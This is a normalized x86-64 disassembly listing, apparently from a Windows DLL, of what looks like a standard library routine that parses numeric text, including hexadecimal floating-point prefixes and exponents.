je r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov rdx r14
mov rcx rdi
call sub_180014f30
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi ] r15
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
movzx eax [ rdi + 0xa ]
sub al r13b
add al 0x30
mov [ r12 ] al
inc r12
inc esi
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi ] r15
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0x8 ] 0x0
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov rdx r14
mov rcx rdi
call sub_180014f30
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
sub_180013670
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x8 ]
sub rsp 0x108
mov [ rbp - 0x60 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x8 ] rax
mov r15 r9
mov [ rsp + 0x68 ] r9
mov rdi r8
mov [ rbp - 0x80 ] rdx
mov r12 rcx
mov rcx [ rbp + 0x70 ]
mov rax [ rbp + 0x78 ]
mov [ rbp - 0x68 ] rax
lea rdx [ rbp - 0x78 ]
call sub_180003910
nop
mov rcx rax
call sub_1800090d0
mov r13 rax
mov [ rsp + 0x78 ] rax
xor ebx ebx
mov rsi [ rbp - 0x78 ]
test rsi rsi
je r-xdata
lea rdx [ rbp - 0x30 ]
mov rcx r13
call sub_1800088d0
nop
mov [ rsp + 0x38 ] 0x30
mov [ rsp + 0x50 ] bx
mov [ rsp + 0x4c ] ebx
lea r14 [ r12 + 0x10 ]
mov [ rbp - 0x70 ] r14
mov [ rsp + 0x20 ] r14
lea r9 [ rsp + 0x4c ]
mov r8d 0x1
lea rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x50 ]
call sub_180017a9c
mov [ rsp + 0x38 ] 0x61
mov [ rsp + 0x54 ] bx
mov [ rsp + 0x4c ] ebx
mov [ rsp + 0x20 ] r14
lea r9 [ rsp + 0x4c ]
mov r8d 0x1
lea rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x54 ]
call sub_180017a9c
mov [ rsp + 0x38 ] 0x41
mov [ rsp + 0x58 ] bx
mov [ rsp + 0x4c ] ebx
mov [ rsp + 0x20 ] r14
lea r9 [ rsp + 0x4c ]
mov r8d 0x1
lea rdx [ rsp + 0x38 ]
lea rcx [ rsp + 0x58 ]
call sub_180017a9c
mov rsi [ rbp - 0x80 ]
mov r12 rsi
mov [ rsp + 0x38 ] 0x0
mov rdx r15
mov rcx rdi
call sub_180014f30
test al al
jne r-xdata
xor edx edx
lea rcx [ rsp + 0x4c ]
call sub_18001775c
mov rax [ rsi + 0x8 ]
test rax rax
je r-xdata
mov [ r12 ] 0x7830
add r12 0x2
mov [ rsp + 0x70 ] r12
xor bl bl
mov [ rsp + 0x30 ] bl
xor eax eax
mov esi eax
mov [ rsp + 0x4c ] eax
mov [ rsp + 0x60 ] eax
mov rdx r15
mov rcx rdi
call sub_180014f30
test al al
jne r-xdata
mov [ rsp + 0x30 ] 0x2b
mov [ rsp + 0x40 ] bx
mov [ rsp + 0x4c ] ebx
mov [ rsp + 0x20 ] r14
lea r9 [ rsp + 0x4c ]
mov r8d 0x1
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x40 ]
call sub_180017a9c
movzx ebx [ rsp + 0x40 ]
mov rcx rdi
call sub_1800147a0
cmp ax bx
jne r-xdata
cmp [ rsi + 0x8 ] rbx
cmove rbx rsi
lea rcx [ rsp + 0x4c ]
call sub_18001778c
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
lea rax [ rbp - 0x30 ]
mov rcx [ rbp - 0x30 ]
mov rdx [ rbp - 0x18 ]
cmp rdx 0x10
cmovae rax rcx
movzx r14d [ rsp + 0x54 ]
movzx r15d [ rsp + 0x58 ]
cmp [ rax ] 0x7f
je r-xdata
mov rcx rdi
call sub_1800147a0
cmp ax [ rsp + 0x50 ]
jne r-xdata
mov [ rsp + 0x30 ] 0x2d
xor eax eax
mov [ rsp + 0x40 ] ax
mov [ rsp + 0x4c ] eax
mov [ rsp + 0x20 ] r14
lea r9 [ rsp + 0x4c ]
lea r8d [ rax + 0x1 ]
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x40 ]
call sub_180017a9c
movzx ebx [ rsp + 0x40 ]
mov rcx rdi
call sub_1800147a0
cmp ax bx
jne r-xdata
mov [ rsi ] 0x2b
jmp r-xdata
xor ebx ebx
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax ]
dec rax
mov [ rsi + 0x8 ] rax
mov rdx [ rsp + 0x68 ]
mov rcx rdi
call sub_180014f30
test al al
jne r-xdata
lea rax [ rbp - 0x30 ]
cmp rdx 0x10
cmovae rax rcx
cmp [ rax ] sil
jle r-xdata
mov rcx rdi
call sub_180014810
mov rdx r15
mov rcx rax
call sub_180014f30
test al al
jne r-xdata
mov [ rsi ] 0x2d
lea r12 [ rsi + 0x1 ]
mov rcx rdi
call sub_180014810
test bl bl
je r-xdata
nop [ rax ] eax
cmp [ rbp - 0x20 ] rsi
jne r-xdata
mov bl 0x1
mov [ rsp + 0x30 ] bl
mov [ rsp + 0x40 ] 0x78
xor r15d r15d
mov [ rsp + 0x48 ] r15w
mov [ rsp + 0x5c ] r15d
mov [ rsp + 0x20 ] r14
lea r9 [ rsp + 0x5c ]
lea r8d [ r15 + 0x1 ]
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x48 ]
call sub_180017a9c
movzx ebx [ rsp + 0x48 ]
mov rcx rdi
call sub_1800147a0
cmp ax bx
je r-xdata
mov rbx [ rsp + 0x68 ]
mov rdx rbx
mov rcx rdi
call sub_180014f30
test al al
jne r-xdata
test esi esi
jne r-xdata
movzx ecx [ rdi + 0xa ]
movzx eax [ rsp + 0x50 ]
cmp ax cx
ja r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov rax [ r13 ]
mov rcx r13
call [ rax + 0x10 ]
movzx r15d ax
xor ebx ebx
xor ebx ebx
movzx r15d bx
jmp r-xdata
mov rcx rdi
call sub_180014810
xor bl bl
jmp r-xdata
mov [ rsp + 0x40 ] 0x58
mov [ rsp + 0x48 ] r15w
mov [ rsp + 0x5c ] r15d
mov [ rsp + 0x20 ] r14
lea r9 [ rsp + 0x5c ]
lea r8d [ r15 + 0x1 ]
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x48 ]
call sub_180017a9c
movzx ebx [ rsp + 0x48 ]
mov rcx rdi
call sub_1800147a0
cmp ax bx
jne r-xdata
xor r13d r13d
cmp [ rdi + 0x8 ] al
jne r-xdata
mov [ r12 ] 0x30
inc r12
cmp r14w cx
ja r-xdata
movzx edx ax
movzx ebx cx
lea eax [ rdx + 0x9 ]
cmp ebx eax
jg r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
lea rdx [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x10
cmovae rdx [ rbp - 0x30 ]
cmp [ rsp + 0x38 ] 0x0
jne r-xdata
nop
mov r12d 0xf
mov [ rbp - 0x40 ] r12
mov r14d 0x1
mov [ rbp - 0x48 ] r14
mov [ rbp - 0x58 ] si
mov rsi rbx
mov rdx [ rsp + 0x68 ]
mov rcx rdi
call sub_180014f30
mov r13 [ rbp - 0x58 ]
test al al
jne r-xdata
mov rdx rbx
mov rcx rdi
call sub_180014f30
movzx r13d [ rsp + 0x50 ]
test al al
jne r-xdata
mov rdx rbx
mov rcx rdi
call sub_180014f30
test al al
jne r-xdata
movzx ebx [ rdi + 0xa ]
mov rax [ r13 ]
mov rcx r13
call [ rax + 0x8 ]
cmp bx ax
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
cmp r15w cx
ja r-xdata
movzx edx r14w
movzx ebx cx
lea eax [ rdx + 0x5 ]
cmp ebx eax
jle r-xdata
sub ebx edx
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
cmp r12 0x10
jb r-xdata
test rsi rsi
je r-xdata
movzx ecx [ rdi + 0xa ]
movzx eax [ rsp + 0x50 ]
cmp ax cx
ja r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
movzx esi [ rsp + 0x30 ]
test sil sil
je r-xdata
nop
mov eax [ rsp + 0x60 ]
test eax eax
jns r-xdata
movzx r15d [ rsp + 0x50 ]
mov r14d [ rsp + 0x60 ]
mov esi 0xffff
nop [ rax + rax ] eax
mov rbx [ rsp + 0x68 ]
call sub_180018c10
mov rcx [ rax ]
movzx eax [ rcx ]
mov [ r12 ] al
inc r12
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
movzx ebx [ rsp + 0x30 ]
movzx edx r15w
movzx ebx cx
lea eax [ rdx + 0x5 ]
cmp ebx eax
jg r-xdata
sub ebx edx
add ebx 0xa
test ebx ebx
js r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
movzx r15d [ rsp + 0x58 ]
movzx r14d [ rsp + 0x54 ]
mov r13 [ rsp + 0x78 ]
mov r12 [ rsp + 0x70 ]
mov esi [ rsp + 0x4c ]
mov rcx r13
call j_sub_180018b3c
jmp r-xdata
movzx ecx [ rdx ]
cmp cl 0x7f
je r-xdata
movzx eax [ rsp + 0x54 ]
cmp ax cx
ja r-xdata
movzx edx ax
movzx ebx cx
lea eax [ rdx + 0x9 ]
cmp ebx eax
jg r-xdata
mov [ rdi ] rbx
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
cmp [ rsp + 0x38 ] 0x0
jne r-xdata
jmp r-xdata
movzx edx [ rdi + 0xa ]
cmp r13w dx
ja r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ r12 ] 0x30
inc r12
inc eax
mov [ rsp + 0x60 ] eax
cmp [ rdi + 0xa ] r15w
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
xor r13d r13d
mov [ rdi ] r13
mov [ rdi + 0x8 ] 0x1
mov rbx [ rsp + 0x68 ]
jmp r-xdata
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
cmp esi 0x24
jl r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
dec rsi
je r-xdata
movzx eax [ rsp + 0x58 ]
cmp ax cx
ja r-xdata
movzx edx ax
movzx ebx cx
lea eax [ rdx + 0x5 ]
cmp ebx eax
jle r-xdata
sub ebx edx
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov r12 [ rbp - 0x80 ]
test sil sil
jne r-xdata
mov rdx rbx
mov rcx rdi
call sub_180014f30
test al al
jne r-xdata
cmp r14w dx
ja r-xdata
movzx r8d r13w
movzx ecx dx
lea eax [ r8 + 0x9 ]
cmp ecx eax
jg r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov [ rsp + 0x60 ] r14d
mov esi [ rsp + 0x4c ]
movzx r14d [ rsp + 0x54 ]
movzx r15d [ rsp + 0x58 ]
dec r14d
mov [ rsp + 0x30 ] 0x1
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ rdi ] r13
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
test esi esi
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov rcx rdi
call sub_1800147a0
cmp ax [ rsp + 0x50 ]
jne r-xdata
inc [ rsp + 0x60 ]
jmp r-xdata
test rsi rsi
jne r-xdata
lea rax [ rbp - 0x58 ]
cmp r12 0x10
cmovae rax r13
cmp cl [ rax + rsi ]
jne r-xdata
lea rax [ rbp - 0x58 ]
cmp r12 0x10
cmovae rax r13
cmp [ rax + rsi ] 0x0
je r-xdata
movzx edx ax
movzx ebx cx
lea eax [ rdx + 0x5 ]
cmp ebx eax
jg r-xdata
sub ebx edx
add ebx 0xa
test ebx ebx
js r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
xor eax eax
mov rcx [ rbp - 0x8 ]
xor rcx rsp
call sub_180018450
add rsp 0x108
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov rcx [ rbp - 0x30 ]
call j_sub_180018b3c
mov [ r12 ] 0x0
mov eax [ rsp + 0x60 ]
mov rcx [ rbp - 0x68 ]
mov [ rcx ] eax
cmp [ rbp - 0x18 ] 0x10
jb r-xdata
cmp [ rdi + 0x8 ] al
jne r-xdata
cmp r15w dx
ja r-xdata
movzx r8d r14w
movzx ecx dx
lea eax [ r8 + 0x5 ]
cmp ecx eax
jle r-xdata
sub ecx r8d
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi ] r13
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi + 0x8 ] 0x0
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
movsxd rax ebx
lea rcx [ r--data ]
movzx eax [ rax + rcx ]
mov [ r12 ] al
inc r12
inc esi
mov [ rsp + 0x4c ] esi
test esi esi
je r-xdata
mov bl 0x1
mov [ rsp + 0x30 ] bl
mov rcx [ rdi ]
test rcx rcx
je r-xdata
cmp [ rdx + 0x1 ] 0x0
jle r-xdata
lea rax [ rbp - 0x58 ]
cmp r12 0x10
cmovae rax r13
cmp cl [ rax ]
jl r-xdata
mov [ rsp + 0x38 ] 0x1
test rsi rsi
je r-xdata
test r15w r15w
je r-xdata
mov [ rsp + 0x30 ] 0x1
cmp [ rsp + 0x4c ] 0x24
jl r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
movzx ebx [ rdi + 0xa ]
mov [ rsp + 0x40 ] 0x70
xor r15d r15d
mov [ rsp + 0x48 ] r15w
mov [ rsp + 0x5c ] r15d
mov r14 [ rbp - 0x70 ]
mov [ rsp + 0x20 ] r14
lea r9 [ rsp + 0x5c ]
lea r8d [ r15 + 0x1 ]
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x48 ]
call sub_180017a9c
cmp bx [ rsp + 0x48 ]
je r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
movzx r8d r15w
movzx ecx dx
lea eax [ r8 + 0x5 ]
cmp ecx eax
jg r-xdata
sub ecx r8d
add ecx 0xa
test ecx ecx
js r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi ] 0x0
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
inc rdx
jmp r-xdata
lea rax [ rbp - 0x58 ]
cmp r12 0x10
cmovae rax r13
cmp [ rax + rsi ] 0x0
jle r-xdata
mov rcx rdi
call sub_1800147a0
cmp ax r15w
jne r-xdata
mov rcx rdi
call sub_1800147a0
cmp ax [ rsp + 0x50 ]
jne r-xdata
inc [ rsp + 0x60 ]
jmp r-xdata
mov [ r12 ] 0x70
inc r12
mov rcx [ rdi ]
test rcx rcx
je r-xdata
cmp [ rdi + 0x8 ] r15b
jne r-xdata
mov [ rdi ] 0x0
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
cmp esi 0x24
jge r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0x8 ] 0x0
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
cmp si ax
je r-xdata
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rsp + 0x38 ] 0x1
inc rsi
jmp r-xdata
or rax 0xffffffffffffffff
sub rax r14
cmp rax 0x1
jbe r-xdata
movsxd rax ebx
lea rcx [ r--data ]
movzx eax [ rax + rcx ]
mov rcx [ rsp + 0x70 ]
mov [ rcx ] al
inc rcx
mov [ rsp + 0x70 ] rcx
inc [ rsp + 0x4c ]
cmp [ rsp + 0x4c ] 0x0
je r-xdata
lea rax [ rbp - 0x58 ]
cmp r12 0x10
cmovae rax r13
cmp [ rax + rsi ] 0x7f
je r-xdata
mov [ rdi ] r15
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] r15
je r-xdata
movzx ebx [ rdi + 0xa ]
mov [ rsp + 0x40 ] 0x50
mov [ rsp + 0x48 ] r15w
mov [ rsp + 0x5c ] r15d
mov [ rsp + 0x20 ] r14
lea r9 [ rsp + 0x5c ]
mov r8d 0x1
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x48 ]
call sub_180017a9c
cmp bx [ rsp + 0x48 ]
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rsp + 0x30 ] 0x1
mov rcx [ rdi ]
test rcx rcx
je r-xdata
movsxd rax ecx
lea rcx [ r--data ]
movzx eax [ rax + rcx ]
mov [ r12 ] al
inc r12
inc esi
mov rdx rbx
mov rcx rdi
call sub_180014f30
test al al
je r-xdata
cmp si ax
je r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov [ rdi + 0x8 ] 0x0
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
lea rcx [ r--data ]
call sub_180016e60
lea rbx [ r14 + 0x1 ]
cmp rbx 0xfffffffffffffffe
ja r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
lea rax [ rbp - 0x58 ]
cmp r12 0x10
cmovae rax r13
inc [ rax + rsi ]
mov r12 [ rbp - 0x40 ]
mov r14 [ rbp - 0x48 ]
mov r13 [ rbp - 0x58 ]
jmp r-xdata
xor r14d r14d
cmp [ rdi + 0x8 ] sil
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] r15d
jle r-xdata
mov [ rdi ] r15
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] r15
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov [ rdi ] 0x0
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
mov rdx [ rsp + 0x68 ]
mov rcx rdi
call sub_180014f30
test al al
jne r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
lea rcx [ r--data ]
call sub_180016e60
cmp r12 rbx
jae r-xdata
xor ebx ebx
mov [ rdi ] rbx
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] 0x0
je r-xdata
mov rdx r15
mov rcx rdi
call sub_180014f30
test al al
jne r-xdata
nop [ rax ] eax
movzx ebx [ rdi + 0xa ]
mov [ rsp + 0x40 ] 0x2b
xor eax eax
mov [ rsp + 0x48 ] ax
mov [ rsp + 0x5c ] eax
mov [ rsp + 0x20 ] r14
lea r9 [ rsp + 0x5c ]
lea r8d [ rax + 0x1 ]
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x48 ]
call sub_180017a9c
cmp bx [ rsp + 0x48 ]
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ rdi + 0x8 ] r15b
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] r15d
jle r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
movzx esi [ rsp + 0x30 ]
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
test rbx rbx
jne r-xdata
mov r8 r14
mov rdx rbx
lea rcx [ rbp - 0x58 ]
call sub_1800029e0
jmp r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
movzx esi [ rsp + 0x30 ]
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
cmp [ rdi + 0xa ] r13w
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
cmp [ rdi + 0x8 ] sil
jne r-xdata
mov [ r12 ] 0x2b
xor eax eax
mov [ rdi ] rax
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] rsi
je r-xdata
xor bl bl
mov [ rsp + 0x30 ] bl
mov esi r15d
mov r15 [ rsp + 0x68 ]
mov rdx r15
mov rcx rdi
call sub_180014f30
test al al
jne r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov [ rdi + 0x8 ] 0x0
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
setne al
test al al
je r-xdata
mov [ rbp - 0x48 ] rbx
lea rax [ rbp - 0x58 ]
cmp r12 0x10
cmovae rax r13
mov [ rax ] bl
mov r13 [ rbp - 0x58 ]
mov r14 [ rbp - 0x48 ]
mov r12 [ rbp - 0x40 ]
test rbx rbx
mov [ rdi + 0x8 ] 0x0
xor ebx ebx
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
cmp r13w [ rdi + 0xa ]
ja r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov [ rsp + 0x30 ] bl
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov [ rdi ] r14
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] rsi
je r-xdata
movzx ebx [ rdi + 0xa ]
mov [ rsp + 0x40 ] 0x2d
xor eax eax
mov [ rsp + 0x48 ] ax
mov [ rsp + 0x5c ] eax
mov [ rsp + 0x20 ] r14
lea r9 [ rsp + 0x5c ]
lea r8d [ rax + 0x1 ]
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x48 ]
call sub_180017a9c
cmp bx [ rsp + 0x48 ]
jne r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
xor r14d r14d
mov [ rdi ] r14
mov [ rdi + 0x8 ] 0x1
movzx ebx sil
jmp r-xdata
mov rax [ rcx + 0x40 ]
cmp [ rax ] rsi
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
mov rdx rbx
mov rcx rdi
call sub_180014f30
test al al
jne r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
inc rsi
lea rax [ rbp - 0x58 ]
cmp r12 0x10
cmovae rax r13
mov [ rax + r14 ] 0x0
mov [ rbp - 0x48 ] rbx
lea rax [ rbp - 0x58 ]
cmp [ rbp - 0x40 ] 0x10
cmovae rax [ rbp - 0x58 ]
mov [ rbx + rax ] 0x0
mov r12 [ rbp - 0x40 ]
mov r14 [ rbp - 0x48 ]
mov r13 [ rbp - 0x58 ]
mov rdx [ rsp + 0x68 ]
mov rcx rdi
call sub_180014f30
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov [ rdi ] r14
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov [ r12 ] 0x30
inc r12
mov [ rdi ] r14
mov [ rdi + 0x8 ] 0x1
mov rax [ rcx + 0x40 ]
cmp [ rax ] rsi
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
movzx ebx sil
mov [ r12 ] 0x2d
jmp r-xdata
xor eax eax
mov [ rdi ] rax
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] rsi
je r-xdata
mov rdx r15
mov rcx rdi
call sub_180014f30
test al al
jne r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
movzx ecx r13w
add ecx 0x9
movzx eax [ rdi + 0xa ]
cmp eax ecx
jg r-xdata
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] 0x0
jle r-xdata
cmp [ rdi + 0x8 ] sil
jne r-xdata
jmp r-xdata
mov rax [ rcx ]
call [ rax + 0x38 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
inc r12
mov rcx [ rdi ]
test rcx rcx
je r-xdata
mov rax [ rcx ]
call [ rax + 0x30 ]
mov rax [ rcx + 0x58 ]
cmp [ rax ] esi
jle r-xdata
mov [ rdi + 0x8 ] sil
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
jmp r-xdata
mov [ rdi + 0x8 ] 0x1
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp esi 0x8
jge r-xdata
mov [ rdi ] r14
mov rdx [ rcx + 0x40 ]
cmp [ rdx ] 0x0
je r-xdata
mov [ rdi + 0xa ] ax
jmp r-xdata
mov rax [ rdx ]
movzx eax [ rax ]
jmp r-xdata
mov [ rdi + 0x8 ] sil
jmp r-xdata
dec [ rax ]
mov rcx [ rcx + 0x40 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
movzx eax [ rdx ]
